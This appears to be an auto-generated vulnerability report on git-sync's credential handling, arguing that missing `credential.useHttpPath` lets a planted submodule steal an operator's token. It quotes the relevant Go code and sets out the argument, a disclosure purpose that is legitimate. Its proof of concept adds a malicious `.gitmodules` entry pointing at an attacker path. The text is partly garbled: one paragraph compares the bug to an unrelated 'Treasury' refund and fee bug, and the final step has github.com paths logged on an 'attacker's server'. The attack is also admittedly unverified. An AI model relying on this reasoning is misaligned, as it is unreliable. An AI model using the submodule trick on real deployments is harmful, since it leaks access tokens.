### Title
Credentials configured for one submodule/repo URL are usable against any repo on the same host due to missing `credential.useHttpPath` scoping - (File: main.go)

### Summary
`git-sync` stores per-URL credentials via `git credential approve` (`repoSync.StoreCredentials`) and relies on git's own `credential.helper` (`cache --timeout 3600`, set globally in `SetupDefaultGitConfigs`) to retrieve and send them. Git's default credential matching operates on protocol+host only, not the full path, unless `credential.useHttpPath` is enabled. `git-sync` never sets this option, so a credential a user scopes to a specific repo/submodule URL (e.g. `--credential='{"url":"https://github.com/orgA/repo1", ...}'`) can be replayed by git against *any* other repository path on that same host — including one an attacker controls by adding a malicious submodule entry pointing at a different path on the same host.

### Finding Description
The `--credential` flag documentation explicitly frames per-URL credentials as being for scoping to specific repos, "for example when using submodules" [1](#0-0) . Credentials are pushed into git's credential store via `StoreCredentials`, which just issues `url=...\nusername=...\npassword=...` to `git credential approve` [2](#0-1) .

The credential backend used for lookups is a global `credential.helper = "cache --timeout 3600"`, configured once in `SetupDefaultGitConfigs` with no accompanying `credential.useHttpPath` setting [3](#0-2) . Git's credential subsystem, by default, matches stored/cached credentials by protocol and host only (path is ignored unless `credential.useHttpPath` is `true`), so a credential approved for `https://host/orgA/repo1` will also be offered by git to `https://host/orgA/repo2` or any other path on `host`.

Submodule URLs are untrusted repo content: they come from `.gitmodules` in the synced repository and are fetched automatically during `configureWorktree`'s `submodule update --init [--recursive]` step whenever `--submodules` is not `off` [4](#0-3) . An attacker who can push a commit/PR that is later synced (or who controls a repository referenced as a submodule) can add a submodule URL pointing to a different path on the same host as a legitimately configured `--credential` (or the main `--repo`), and git will present the operator's stored credential (username/password/token) to that attacker-controlled path when fetching the submodule.

This mirrors the report's bug class: a credential/authorization that the operator intends to scope narrowly (to one specific `url`, i.e. the equivalent of the Treasury's intended "correct refund amount" or "earned fees") is not actually constrained to that scope by the underlying mechanism (missing `useHttpPath` is the equivalent of missing the fee/deposit-tracking mapping), so it can be exercised/drained against unintended targets.

### Impact Explanation
If an operator uses `--credential` (or `--username`/`--password-file`) with a token that has broader host-level privileges than intended (e.g. a GitHub PAT that can read multiple private repos on `github.com`), and the synced repo (or a nested submodule) is attacker-influenced, the attacker can cause git to present that token to an attacker-controlled endpoint hosted at another path on the trusted host (or, more critically, any server presenting itself under a scheme/host git resolves the same way), resulting in credential/token disclosure. This is a credential/token handling and submodule-driven analog to the reported bug: privileged material (the stored credential) is usable beyond its intended, narrower scope.

### Likelihood Explanation
Requires: (1) `--submodules` not set to `off` (default is `recursive`), (2) the operator configuring a credential scoped to a specific URL/path (the exact scenario the `--credential` flag's docs recommend for submodules), and (3) an attacker being able to introduce a submodule entry (via a pushed commit, PR merge, or a nested/transitive submodule) pointing to a different path on the same host. This is a realistic, commonly-recommended configuration (multi-repo/submodule sync with per-URL tokens), making the precondition plausible without requiring a malicious operator or leaked key.

### Recommendation
Set `credential.useHttpPath = true` globally (or scope it per-host via `credential.<url>.useHttpPath`) in `SetupDefaultGitConfigs` so git only offers a stored credential for the exact URL/path it was approved for, not merely the same protocol+host. Additionally, consider using `git credential reject`/scoped credential helpers instead of a shared `cache` helper so that credentials approved for one URL cannot be matched against sibling paths on the same host.

### Proof of Concept
1. Operator runs git-sync with:
   ```
   --repo=https://github.com/orgA/main-repo
   --credential='{"url":"https://github.com/orgA/private-repo","username":"x-access-token","password-file":"/creds/token"}'
   --submodules=recursive
   ```
2. Attacker (with push access to `main-repo` or control of an existing submodule) adds a `.gitmodules` entry:
   ```
   [submodule "evil"]
     path = evil
     url = https://github.com/orgA/attacker-controlled-path
   ```
   (any path on `github.com` that the attacker controls, e.g. their own public repo under `orgA` if permitted, or more generally any host git resolves identically).
3. On next sync, `configureWorktree` runs `git submodule update --init --recursive`, and because `credential.helper=cache` has no `useHttpPath`, git matches the credential approved for `https://github.com/orgA/private-repo` against `https://github.com/orgA/attacker-controlled-path` (same host) and sends the Basic Auth credential to that endpoint.
4. Attacker's server logs the exfiltrated `username`/token.

Note: I was not able to execute this end-to-end in a live environment to observe git's exact host-vs-path matching behavior for every git version/transport combination; this is based on documented git credential-matching semantics (`gitcredentials(7)`) and the absence of `useHttpPath` configuration in the codebase, which I confirmed via `grep_search` across the repository [3](#0-2) .

// StoreCredentials stores a username and password for later use.
func (git *repoSync) StoreCredentials(ctx context.Context, url, username, password string) error {
	git.log.V(1).Info("storing git credential", "url", redactURL(url))
	git.log.V(9).Info("md5 of credential", "url", url, "username", md5sum(username), "password", md5sum(password))

	creds := fmt.Sprintf("url=%v\nusername=%v\npassword=%v\n", url, username, password)
	_, _, err := git.RunWithStdin(ctx, "", creds, "credential", "approve")
	if err != nil {
		return fmt.Errorf("can't configure git credentials: %w", err)
	}

	return nil
}

// SetupDefaultGitConfigs configures the global git environment with some
// default settings that we need.
func (git *repoSync) SetupDefaultGitConfigs(ctx context.Context) error {
	configs := []keyVal{{
		// Never auto-detach GC runs.
		key: "gc.autoDetach",
		val: "false",
	}, {
		// Fairly aggressive GC.
		key: "gc.pruneExpire",
		val: "now",
	}, {
		// How to manage credentials (for those modes that need it).
		key: "credential.helper",
		val: "cache --timeout 3600",
	}, {
		// Never prompt for a password.
		key: "core.askPass",
		val: "true",
	}}

	for _, kv := range configs {
		if _, _, err := git.Run(ctx, "", "config", "--global", kv.key, kv.val); err != nil {
			return fmt.Errorf("error configuring git %q %q: %w", kv.key, kv.val, err)
		}
	}
	return nil
}
